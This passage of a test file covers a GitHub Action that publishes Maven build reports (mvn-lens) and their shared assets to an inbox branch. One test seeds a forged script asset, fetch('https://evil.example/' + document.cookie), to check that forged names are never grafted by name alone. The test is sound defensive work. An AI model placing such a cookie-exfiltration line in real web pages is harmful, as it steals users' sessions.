  assert.ok(original.includes('<style>'), 'the report on disk still carries its shell inline');
  assert.equal(inboxMeta(fake, `j${JOB_ID}-s3`).reports[0].bytes, Buffer.byteLength(html), 'meta counts what was published');
  assert.match(stdout, /shell split into 3 shared asset\(s\)/);
  assert.ok(!stdout.includes('::warning::'), stdout);
});

test('the shell travels once per run: another job grafts it by sha, a re-run commits nothing', async () => {
  const fake = scenario();
  const build = shellWorkspace();
  const first = await runReport(fake, build.dir);
  assert.equal(first.res.exitCode, 0, first.stdout);
  const mark = fake.calls.length;

  // The lint job of the same run publishes its own report, built by the same
  // mvn-lens: another key directory, the very same shell.
  const model = fixtureModel();
  model.session.totalMs = 4242;
  const second = await runReport(fake, shellWorkspace(model).dir, { RUNNER_NAME: 'GitHub Actions 8', GITHUB_JOB: 'lint', BUILD_MONITOR_DEBUG: '1' });
  assert.equal(second.res.exitCode, 0, second.stdout);
  assert.notEqual(second.out.key, first.out.key);
  const dirA = `reports/${RUN_ID}/${first.out.key}`;
  const dirB = `reports/${RUN_ID}/${second.out.key}`;
  const shell = fake.store.listDir(INBOX, dirA).filter(n => n.startsWith('lens-'));
  assert.equal(shell.length, 3);
  assert.deepEqual(fake.store.listDir(INBOX, dirB).filter(n => n.startsWith('lens-')), shell, 'content-hashed: the same shell, the same names');
  for (const n of shell) assert.ok(Buffer.compare(inboxFile(fake, `${dirA}/${n}`), inboxFile(fake, `${dirB}/${n}`)) === 0, n);
  const posts = fake.calls.slice(mark).filter(c => c.method === 'POST' && c.path.endsWith('/git/blobs'));
  assert.equal(posts.length, 2, 'report.html and meta.json: the shell was grafted by sha, not uploaded a second time');
  assert.match(second.stdout, new RegExp(`\\[debug\\].*already in the inbox of run ${RUN_ID}`));

  // The assets are pushed on every publish, up to date or not — and the commit
  // is still a no-op, because each path already holds exactly those bytes.
  const head = fake.store.headOf(INBOX);
  const again = await runReport(fake, build.dir);
  assert.equal(again.out.published, 'true');
  assert.equal(again.out['commit-sha'], head, 'no new commit');
  assert.match(again.stdout, /already up to date/);
});

test('two reports of one step contribute one set of assets, not one set each', async () => {
  const fake = scenario();
  const dir = tmpDir('multi-shell');
  for (const [mod, totalMs] of [['core', 7975], ['web', 4242]]) {
    const model = fixtureModel();
    model.session.totalMs = totalMs;
    const file = path.join(dir, mod, 'target', 'mvnlens', 'report.html');
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, fakeShellReportHtml(model));
    fs.utimesSync(file, REPORT_WRITTEN_AT / 1000, REPORT_WRITTEN_AT / 1000);
  }
  const { res, out, stdout } = await runReport(fake, dir, { INPUT_REPORT: '**/target/mvnlens/report.html' });
  assert.equal(res.exitCode, 0, stdout);
  // Both reports carry the same shell, so both name the same three assets. One
  // entry per report would be a duplicate path, which aborts the whole commit:
  // the step stays green and publishes nothing at all.
  assert.equal(out.published, 'true', stdout);
  assert.ok(!stdout.includes('duplicate path'), stdout);
  const keyDir = `reports/${RUN_ID}/j${JOB_ID}-s3`;
  const names = fake.store.listDir(INBOX, keyDir);
  const shell = names.filter(n => n.startsWith('lens-'));
  assert.equal(shell.length, 3, `one stylesheet and two scripts for the two reports: ${names.join(', ')}`);
  assert.deepEqual(names, shell.concat(['meta.json', 'report-2.html', 'report.html']));
  for (const rep of ['report.html', 'report-2.html']) {
    const html = String(inboxFile(fake, `${keyDir}/${rep}`));
    for (const n of shell) assert.ok(html.includes(`<link rel="stylesheet" href="../../../assets/${n}">`) || html.includes(`<script src="../../../assets/${n}"></script>`), `${rep} references ${n}`);
  }
  assert.equal(inboxMeta(fake, `j${JOB_ID}-s3`).reports.length, 2);
});

test('an asset name the inbox already holds with OTHER bytes is uploaded, never grafted', async () => {
  const fake = scenario();
  const ws = shellWorkspace();
  // Exactly what this job will publish — the action compresses, then splits.
  const split = splitReportHtml(compressReportHtml(fs.readFileSync(ws.file, 'utf8')).html);
  assert.equal(split.split, true, split.reason);
  const target = split.assets.find(a => a.name.endsWith('.js'));

  // The inbox is written by build jobs holding a contents:write token, so
  // another key directory of the same run can carry a well-formed asset NAME
  // over bytes nobody hashed. The name proves nothing; only the sha does.
  const forged = 'fetch("https://evil.example/" + document.cookie);\n';
  fake.store.seedBranch(INBOX, { [`reports/${RUN_ID}/jOTHER-s1/${target.name}`]: forged });

  const { res, out, stdout } = await runReport(fake, ws.dir, { BUILD_MONITOR_DEBUG: '1' });
  assert.equal(res.exitCode, 0, stdout);
  assert.equal(out.published, 'true');
  const got = inboxFile(fake, `reports/${RUN_ID}/${out.key}/${target.name}`);
  assert.ok(Buffer.compare(got, target.content) === 0, 'the job uploaded its own bytes');
  assert.ok(!String(got).includes('evil.example'), 'the forged blob was not grafted into this key — the processor would lift it to the site root, and every report on the site loads it');
  assert.ok(!stdout.includes(`${target.name} is already in the inbox`), stdout);

  // The sha check is what makes the difference: the same name over the SAME
  // bytes elsewhere in the run is still grafted rather than re-uploaded.
  const other = split.assets.find(a => a.name.endsWith('.css'));
  fake.store.seedBranch(INBOX, { [`reports/${RUN_ID}/jOTHER-s1/${other.name}`]: other.content.toString('utf8') });
  const again = await runReport(fake, shellWorkspace().dir, { RUNNER_NAME: 'GitHub Actions 8', GITHUB_JOB: 'lint', BUILD_MONITOR_DEBUG: '1' });
  assert.equal(again.res.exitCode, 0, again.stdout);
  assert.match(again.stdout, new RegExp(`${other.name} is already in the inbox`));
  const grafted = inboxFile(fake, `reports/${RUN_ID}/${again.out.key}/${other.name}`);
  assert.ok(Buffer.compare(grafted, other.content) === 0, 'grafted by sha: the bytes are the ones this job hashed');
  const js = inboxFile(fake, `reports/${RUN_ID}/${again.out.key}/${target.name}`);
  assert.ok(!String(js).includes('evil.example'), 'the forged name is still not trusted, whichever job publishes next');
});

test('compress: false publishes the report whole: the shell is not split either', async () => {
  const fake = scenario();
  const ws = shellWorkspace();
  const { res, out, stdout } = await runReport(fake, ws.dir, { INPUT_COMPRESS: 'false' });
  assert.equal(res.exitCode, 0, stdout);
  assert.equal(out.published, 'true');
  const dir = `reports/${RUN_ID}/j${JOB_ID}-s3`;
  assert.deepEqual(fake.store.listDir(INBOX, dir), ['meta.json', 'report.html'], 'nothing but the report set');
  assert.ok(Buffer.compare(inboxFile(fake, `${dir}/report.html`), fs.readFileSync(ws.file)) === 0, 'byte-identical');
});

test('the repository sample report with label "sample" (what the CI self-test publishes)', async () => {
  const fake = scenario();
  // A copy of the fixture under the same relative path, with a controlled mtime: the
  // checked-out file's mtime is "now" on CI, which would attribute it to the running step.
  const dir = tmpDir('sample');
  const rel = path.join('test', 'fixtures', 'sample-report', 'report.html');
  fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
  fs.copyFileSync(path.join(ROOT, rel), path.join(dir, rel));
  fs.utimesSync(path.join(dir, rel), REPORT_WRITTEN_AT / 1000, REPORT_WRITTEN_AT / 1000);
  const { res, out } = await runReport(fake, dir, { INPUT_REPORT: 'test/fixtures/sample-report/report.html', INPUT_LABEL: 'sample' });
  assert.equal(res.exitCode, 0);
  assert.equal(out.found, 'true');
  assert.equal(out.published, 'true');
  assert.equal(out.key, `j${JOB_ID}-s3-sample`);
  assert.equal(out['maven-total-ms'], '7975');
  const meta = inboxMeta(fake, out.key);
  assert.equal(meta.reports[0].compressed, false, 'the sample has no pako: left alone');
  assert.equal(meta.reports[0].originalPath, 'test/fixtures/sample-report/report.html');
});

test('site-url input and inbox-prefix input are honoured', async () => {
  const fake = scenario();
  const ws = workspace();
  const { out } = await runReport(fake, ws.dir, { 'INPUT_SITE-URL': 'https://ci.example.org/monitor', 'INPUT_INBOX-PREFIX': 'refs/heads/ci-inbox' });
  assert.equal(out.published, 'true');
  assert.equal(out['monitor-url'], `https://ci.example.org/monitor/#/run/${RUN_ID}`);
  assert.equal(out['report-url'], `https://ci.example.org/monitor/#/report/${RUN_ID}/j${JOB_ID}-s3`);
  assert.ok(fake.store.headOf(`ci-inbox/${RUN_ID}`), 'committed under the custom prefix');
  assert.equal(fake.store.headOf(INBOX), null);
  assert.ok(!fake.calls.some(c => c.path.endsWith('/pages')), 'no Pages lookup when site-url is given');
});

test('the token never appears in outputs, the job summary or the log', async () => {
  const fake = scenario();
  const ws = workspace();
  const ok = await runReport(fake, ws.dir);
  const denied = await runReport(scenario({ readOnly: true }), ws.dir, { 'INPUT_FAIL-ON-ERROR': 'true' });
  for (const r of [ok, denied]) {
    const text = JSON.stringify(r.out) + r.summary + r.stdout;
    assert.ok(!text.includes(TOKEN), 'token leaked: ' + text.slice(0, 500));
  }
  assert.ok(fake.calls.every(c => c.headers.authorization === `Bearer ${TOKEN}`), 'every request carried the token');
});

// ---------------------------------------------------------------------------
// Pure helpers
// ---------------------------------------------------------------------------

test('keyFor: job/step keys, random keys from the job key, sanitised labels, always a valid key', () => {
  const { isValidKey } = require('../src/history');
  assert.equal(keyFor({ job: { id: 12 }, step: { number: 5 } }, 'build', null), 'j12-s5');
  assert.equal(keyFor({ job: { id: 12 }, step: null }, 'build', 'x'), 'j12-x');
  assert.equal(keyFor({ job: { id: 12 }, step: { number: 5 } }, 'build', 'Java 25 / linux'), 'j12-s5-Java-25-linux');
  assert.equal(keyFor({ job: { id: 12 }, step: { number: 5 } }, 'build', '../..'), 'j12-s5', 'a label without safe characters is dropped from the key');
  assert.match(keyFor({ job: null, step: null }, 'build', null), /^build-[0-9a-z]{6}$/);
  assert.match(keyFor({ job: null, step: null }, null, null), /^job-[0-9a-z]{6}$/);
  assert.match(keyFor({ job: null, step: null }, '_private job', 'L'), /^private-job-[0-9a-z]{6}-L$/);
  assert.match(keyFor({ job: null, step: null }, '.', null), /^job-[0-9a-z]{6}$/, 'a job key without safe characters falls back to "job"');
  for (const k of [keyFor({ job: null }, 'x'.repeat(200), 'y'.repeat(200)), keyFor({ job: { id: 1 }, step: { number: 2 } }, null, '...---___')]) {
    assert.ok(isValidKey(k) && /^[A-Za-z0-9]/.test(k), k);
  }
  const keys = new Set();
  for (let i = 0; i < 50; i++) keys.add(keyFor({ job: null }, 'b', null));
  assert.equal(keys.size, 50, 'random suffixes differ');
});

test('reportLabels: grand-parent directory names, or the first ancestor level that tells the files apart', () => {
  assert.deepEqual(reportLabels(['/w/a/target/mvnlens/report.html', '/w/b/target/mvnlens/report.html']), ['a', 'b']);
  assert.deepEqual(reportLabels(['/w/target/mvnlens/report.html', '/w/target/scenario/report.html']), ['mvnlens', 'scenario'], 'only the parent differs');
  assert.deepEqual(reportLabels(['/w/x/one/r.html', '/w/y/two/r.html']), ['x', 'y']);
  assert.deepEqual(reportLabels(['/w/same/deep/r1.html', '/w/same/deep/r2.html']), ['same', 'same']);
});

test('describeFailure: permission / rate-limit / conflict reasons, anything else is unexpected', () => {
  const perm = describeFailure(new GitStoreError('permission', 'create blob in acme/widgets: Resource not accessible by integration (HTTP 403)'));
  assert.match(perm.reason, /Resource not accessible by integration/);
  assert.match(perm.reason, /grant contents: write to this job \(pull requests from forks have a read-only token\)/);
  assert.equal(perm.unexpected, false);
  assert.deepEqual(describeFailure(new GitStoreError('rate-limit', 'x')).reason, 'GitHub API rate limited');
  assert.deepEqual(describeFailure(new GitStoreError('conflict', 'x')).reason, 'could not commit within the time budget');
  assert.equal(describeFailure(new GitStoreError('other', 'repository has no commits yet')).unexpected, true);
  assert.equal(describeFailure(new TypeError('boom')).reason, 'boom');
  assert.equal(describeFailure(new TypeError('boom')).unexpected, true);
});

// ---------------------------------------------------------------------------
// Spawn: the real entry point against the fake over HTTP
// ---------------------------------------------------------------------------

test('report/index.js runs as a process against fake.serve(): GITHUB_OUTPUT and exit codes', async () => {
  const fake = scenario();
  const { url, close } = await fake.serve();
  try {
    const ws = workspace();
    const cap = captureOutputs();
    const runAction = (extra) => {
      const env = Object.assign({}, process.env, actionEnv(cap, Object.assign({ GITHUB_API_URL: url }, extra || {})));
      for (const k of Object.keys(env)) if (env[k] === null || env[k] === undefined) delete env[k];
      return spawnNode([path.join(ROOT, 'report', 'index.js')], { cwd: ws.dir, env });
    };
    const ok = await runAction();
    assert.equal(ok.status, 0, ok.stdout + ok.stderr);
    const out = cap.outputs();
    assert.equal(out.found, 'true');
    assert.equal(out.published, 'true');
    assert.equal(out.key, `j${JOB_ID}-s3`);
    assert.equal(out['commit-sha'], fake.store.headOf(INBOX));
    assert.equal(out['report-url'], `${SITE}#/report/${RUN_ID}/j${JOB_ID}-s3`);
    assert.match(String(inboxFile(fake, `reports/${RUN_ID}/j${JOB_ID}-s3/report.html`)), /gzip:/);
    assert.match(cap.summary(), /### mvn-lens report — build › Build with Maven/);
    assert.ok(!ok.stdout.includes(TOKEN) && !ok.stderr.includes(TOKEN));

    cap.reset();
    fake.opts.readOnly = true;
    const denied = await runAction({ 'INPUT_FAIL-ON-ERROR': 'true', INPUT_LABEL: 'again' });
    assert.equal(denied.status, 1, denied.stdout + denied.stderr);
    assert.equal(cap.outputs().published, 'false');
    assert.match(cap.outputs().reason, /contents: write/);
    assert.match(denied.stdout, /::error::/);
  } finally {
    await close();
  }
});

// ---------------------------------------------------------------------------
// Job summary: the Overview of the report and the monitoring note
// ---------------------------------------------------------------------------

const { summarizeModel } = require('../src/mvnlens');
const { overviewOf, renderOverview, GANTT_INIT } = require('../src/overview');
const reportAction = require('../src/report');
const context = require('../src/context');

test('the Overview in the job summary mirrors the dashboard: cards, project, module and phase times, timeline, GC, issues, warnings', async () => {
  const fake = scenario();
  const model = fixtureModel();
  model.issues = [{
    atMs: 1, severity: 'ERROR', source: 'mojo', moduleKey: 'org.mvnlens.it:lib-a:1.0-SNAPSHOT',
    plugin: 'org.apache.maven.plugins:maven-surefire-plugin', goal: 'test', executionId: 'default-test', phase: 'test',
    exceptionType: 'org.apache.maven.plugin.MojoFailureException', message: 'There are test failures.\n\nPlease refer to target/surefire-reports',
  }];
  model.warnings = ['Fork JVM lib-b: recording truncated | see the log'];
  const ws = workspace(model);
  const { res, summary } = await runReport(fake, ws.dir);
  assert.equal(res.exitCode, 0);
  const md = summary.replace(/\r\n/g, '\n');
  assert.ok(md.includes('| **12% of machine**<br>903 ms machine-time · all JVMs | **1**<br>singlethreaded · sequential | **4**<br>across 4 modules | **test**<br>1.7 s | **0 ms**<br>17 events | **9.9 s**<br>45 compilations | **LibATest**<br>#name · 133 ms |'), md);
  assert.ok(md.includes('<details open>\n<summary><b>Project</b> · 5 modules</summary>\n\norg.mvnlens.it:it04-multi-module:1.0-SNAPSHOT — 5 modules, packagings = 1 pom, 4 jar. Listed in reactor build order.\n\n1. IT04: Muti-module `pom`\n2. Library A `jar`'), md);
  assert.ok(md.includes('<details open>\n<summary><b>Module wall time</b> · 5 modules</summary>'), md);
  assert.ok(md.includes('| Module | Time | |\n|---|---:|---|\n| Library A | 3.1 s | ████████████████████ |\n| Application | 1.4 s | █████████ |'), md);
  assert.ok(md.includes('<details open>\n<summary><b>Lifecycle phase time</b> · 3 phases</summary>'), md);
  assert.ok(md.includes('| Phase | Time | |\n|---|---:|---|\n| compile | 844 ms | ████████████████████ |\n| clean | 178 ms | ████ |\n| process-resources | 171 ms | ████ |'), md);
  assert.ok(md.includes('<summary><b>Build timeline, CPU and memory usage</b> · 5 modules</summary>'), md);
  // A Mermaid gantt (GitHub draws it): one task per module at its true window; the ":" of "IT04: Muti-module" would end the task name.
  assert.ok(md.includes(`\`\`\`mermaid\n${GANTT_INIT}\ngantt\n    dateFormat HH:mm:ss.SSS\n    axisFormat %M:%S\n    tickInterval 1second\n    todayMarker off\n    section Modules\n    IT04 Muti-module (262 ms) :m1, 00:00:00.217, 00:00:00.479\n    Library A (3.1 s) :m2, 00:00:00.479, 00:00:03.613\n`), md);
  assert.ok(md.includes('    Application (1.4 s) :m5, 00:00:06.222, 00:00:07.572\n```\n'), md);
  assert.ok(!md.includes('<b>CPU usage</b>') && !md.includes('<b>GC pause</b>'), 'the tables mvn-lens removed from its Overview are not written: ' + md);
  assert.ok(md.includes('<details open>\n<summary><b>Issues</b> · 1 issue</summary>\n\n**1 issue recorded** · 1 error\n\n- ❌ **ERROR** · mojo · org.mvnlens.it:lib-a:1.0-SNAPSHOT org.apache.maven.plugins:maven-surefire-plugin:test @default-test (test) — There are test failures. Please refer to target/surefire-reports `org.apache.maven.plugin.MojoFailureException`'), md);
  assert.ok(md.includes('<details open>\n<summary><b>Warnings</b> · 1</summary>\n\n- Fork JVM lib-b: recording truncated \\| see the log'), md);
  const n = model.tests.junitPlatform.length;
  assert.ok(md.includes(`<details open>\n<summary><b>Tests</b> · no failure · ${n} slowest</summary>\n\nNo failed test.\n\n**${n} slowest tests** · mvn-lens ranks up to 10 per test framework; failures are listed above in full, so a fast failing test is not here\n\n| # | Test | Module | Framework | Duration |\n|---:|---|---|---|---:|\n| 1 | **LibATest**<br>#name | lib-a | JUNIT5 | 133 ms |\n| 2 | **AppTest**<br>#describes | app | JUNIT5 | 128 ms |`), md);
  // The monitoring note opens the summary: it is what a reader of the run page needs first.
  assert.ok(md.startsWith(`## 🔎 To go further: a more in-depth report, available a few minutes after this summary\n\n- 📊 **[This report](${SITE}#/report/${RUN_ID}/j${JOB_ID}-s3)** — the full mvn-lens report of this Maven build: timeline, tests, CPU, memory, GC, JIT and flame graphs\n- 🏃 **[This run](${SITE}#/run/${RUN_ID})** — every Maven build of this workflow run\n- 📚 **[All mvn-lens reports](${SITE}#/reports)** — the history kept on the monitoring page\n\n**Monitoring page: [${SITE}](${SITE})**  \n_This summary was written as the build ended; the Build monitor workflow processes the run once it completes, then GitHub Pages publishes the page — a few minutes later._\n\n### mvn-lens report — `), md.slice(0, 700));
  assert.ok(md.indexOf('_This summary was written as the build ended;') < md.indexOf('\n### mvn-lens report — '), md.slice(0, 600));
});

test('job-summary: brief keeps the one-line block (with the few-minutes note, the report count, or the reason), none writes nothing, an unknown value warns and falls back to overview', async () => {
  const fake = scenario();
  const ws = workspace();
  const brief = await runReport(fake, ws.dir, { 'INPUT_JOB-SUMMARY': 'brief' });
  assert.equal(brief.res.exitCode, 0);
  assert.equal(brief.out.published, 'true');
  assert.deepEqual(brief.summary.trim().split(/\r?\n/), [
    '### mvn-lens report — build › Build with Maven',
    `Maven \`clean verify\` · **8.0 s** total · wall 7.6 s · CPU 903 ms · OK · 🔎 to go further, a few minutes after this summary: [in-depth report](${SITE}#/report/${RUN_ID}/j${JOB_ID}-s3) · [monitoring](${SITE}#/run/${RUN_ID})`,
  ]);

  const multi = tmpDir('brief-multi');
  writeReport(path.join(multi, 'core', 'target', 'mvnlens', 'report.html'));
  writeReport(path.join(multi, 'web', 'target', 'mvnlens', 'report.html'));
  const two = await runReport(scenario(), multi, { 'INPUT_JOB-SUMMARY': 'brief', INPUT_REPORT: '**/target/mvnlens/report.html' });
  assert.equal(two.out.published, 'true');
  assert.deepEqual(two.summary.trim().split(/\r?\n/), [
    '### mvn-lens reports — build › Build with Maven',
    `Maven \`clean verify\` · **8.0 s** total · wall 7.6 s · CPU 903 ms · OK · 2 reports · 🔎 to go further, a few minutes after this summary: [in-depth reports](${SITE}#/report/${RUN_ID}/j${JOB_ID}-s3) · [monitoring](${SITE}#/run/${RUN_ID})`,
  ]);

  const unpublished = await runReport(fake, ws.dir, { 'INPUT_JOB-SUMMARY': 'brief', 'INPUT_GITHUB-TOKEN': '', GITHUB_TOKEN: null });
  assert.equal(unpublished.res.exitCode, 0);
  assert.equal(unpublished.out.published, 'false');
  assert.deepEqual(unpublished.summary.trim().split(/\r?\n/), [
    '### mvn-lens report — build',   // without a token the step cannot be resolved: the job key alone
    'Maven `clean verify` · **8.0 s** total · wall 7.6 s · CPU 903 ms · OK · not published: github-token is empty; pass the workflow token (it needs contents: write and actions: read)',
  ]);

  const none = await runReport(fake, ws.dir, { 'INPUT_JOB-SUMMARY': 'none' });
  assert.equal(none.res.exitCode, 0);
  assert.equal(none.out.published, 'true');
  assert.equal(none.summary, '');

  const odd = await runReport(fake, ws.dir, { 'INPUT_JOB-SUMMARY': 'full' });
  assert.equal(odd.res.exitCode, 0);
  assert.match(odd.stdout, /::warning::build-monitor: job-summary "full" is not one of overview, brief, none; using overview/);
  assert.match(odd.summary, /\*\*Duration 8\.0 s\*\*/);
});

test('the monitoring note spells the site out (a custom site-url too) and explains a missing token', async () => {
  const fake = scenario();
  const ws = workspace();
  const custom = await runReport(fake, ws.dir, { 'INPUT_SITE-URL': 'https://ci.example.org/monitor' });
  assert.equal(custom.out.published, 'true');
  assert.ok(custom.summary.replace(/\r\n/g, '\n').includes('- 📊 **[This report](https://ci.example.org/monitor/#/report/777/j7770-s3)** — the full mvn-lens report of this Maven build: timeline, tests, CPU, memory, GC, JIT and flame graphs\n- 🏃 **[This run](https://ci.example.org/monitor/#/run/777)** — every Maven build of this workflow run\n- 📚 **[All mvn-lens reports](https://ci.example.org/monitor/#/reports)** — the history kept on the monitoring page\n\n**Monitoring page: [https://ci.example.org/monitor/](https://ci.example.org/monitor/)**  \n'), custom.summary);

  const noToken = await runReport(fake, ws.dir, { 'INPUT_GITHUB-TOKEN': '', GITHUB_TOKEN: null });
  assert.equal(noToken.res.exitCode, 0);
  assert.equal(noToken.out.published, 'false');
  assert.match(noToken.summary, /\*\*Duration 8\.0 s\*\*/);
  assert.ok(noToken.summary.replace(/\r\n/g, '\n').includes(`## ⚠️ This report was not published\n\n**Reason:** github-token is empty; pass the workflow token (it needs contents: write and actions: read).  \nIt will not appear on the monitoring page [${SITE}](${SITE}).\n`), noToken.summary);
});

test('renderSummary: a report whose Overview would take the summary past MAX_SUMMARY_BYTES gets the brief line (GitHub drops a step summary above 1 MiB)', () => {
  const model = fixtureModel();
  const rep = { name: 'report.html', label: null, summary: summarizeModel(model), overview: overviewOf(model) };
  const state = (reports) => ({ reports, summary: rep.summary, where: 'build › Build with Maven', published: true, urls: context.monitorUrls(SITE, RUN_ID, `j${JOB_ID}-s3`), reason: null });
  const one = reportAction.renderSummary(state([rep]), 'overview');
  const perReport = Buffer.byteLength(one, 'utf8');
  assert.ok(perReport > 2000 && perReport < 64 * 1024, `one Overview is ${perReport} bytes`);
  const n = Math.ceil(reportAction.MAX_SUMMARY_BYTES / perReport * 1.5);   // `one` includes the monitoring note: the blocks alone are smaller
  const reports = Array.from({ length: n }, (_, i) => Object.assign({}, rep, { name: i ? `report-${i + 1}.html` : 'report.html', label: `r${i}` }));
  const md = reportAction.renderSummary(state(reports), 'overview');
  // The Overviews stop under the cap; what follows is one brief line per remaining report, far from GitHub's 1 MiB.
  assert.ok(Buffer.byteLength(md, 'utf8') < reportAction.MAX_SUMMARY_BYTES + 64 * 1024 && Buffer.byteLength(md, 'utf8') < 1024 * 1024, `${Buffer.byteLength(md, 'utf8')} bytes`);
  const overviews = (md.match(/\*\*Duration 8\.0 s\*\*/g) || []).length;
  assert.ok(overviews >= 1 && overviews < n, `${overviews} Overviews of ${n} reports`);
  assert.equal((md.match(/^### mvn-lens report — /gm) || []).length, n, 'every report keeps its heading');
  // The Overviews come first, then only brief lines (the reports are the same size), and the cut is exactly where the
  // code puts it: the Overview blocks written so far (`used`, without the newlines joining them) fit under the cap with
  // room for the last one's body, and one more Overview body would not fit.
  const parts = md.split(/(?=^### mvn-lens report — )/m);   // parts[0] is the monitoring note, then one part per report
  assert.ok(parts[0].startsWith('## 🔎 To go further: more in-depth reports, available a few minutes after this summary'), 'the note opens the summary');
  const blocks = parts.slice(1);
  const k = blocks.findIndex(b => !b.includes('**Duration 8.0 s**'));
  assert.equal(k, overviews, 'the Overviews come first');
  assert.ok(blocks.slice(k).every(b => !b.includes('**Duration ')), 'then only brief lines');
  // What the code had counted when it cut: the note and the k Overview blocks, without the k + 1 newlines joining them here.
  const used = Buffer.byteLength(parts.slice(0, k + 1).join(''), 'utf8') - (k + 1);
  const body = Buffer.byteLength(renderOverview(rep.overview), 'utf8');
  assert.ok(used - body <= reportAction.MAX_SUMMARY_BYTES, `the last Overview fitted: ${used} - ${body} bytes`);
  assert.ok(used + body > reportAction.MAX_SUMMARY_BYTES, `one more would not: ${used} + ${body} bytes`);
  assert.ok(md.includes(`### mvn-lens report — build › Build with Maven · r${n - 1}\n\nMaven \`clean verify\` · **8.0 s** total · wall 7.6 s · CPU 903 ms · OK\n`), 'the last report has the brief line');
  assert.ok(md.includes(`- 📊 **[These reports](${SITE}#/report/${RUN_ID}/j${JOB_ID}-s3)**`), md.slice(0, 600));
});
